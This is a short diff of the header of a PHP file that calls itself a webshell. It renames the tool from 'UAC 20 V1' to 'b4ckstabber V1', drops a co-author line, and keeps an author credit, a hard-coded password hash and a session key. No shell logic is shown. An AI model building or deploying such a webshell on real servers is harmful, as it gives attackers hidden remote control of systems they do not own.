@@ -1,8 +1,7 @@
 <?php
-// UAC 20 V1 WEBSHELL
+// b4ckstabber V1 WEBSHELL
 // AUTHOR : MatrixTM26
 // GitHub : https://github.com/MatrixTM26
-// CO-AUTHORED: UAC 20 GROUP
 
 define("PASSWORD_HASH", "bc04b13eeb0a6c2f1303ca0e36263fd3");
 define("SESSION_KEY", "fm_auth");
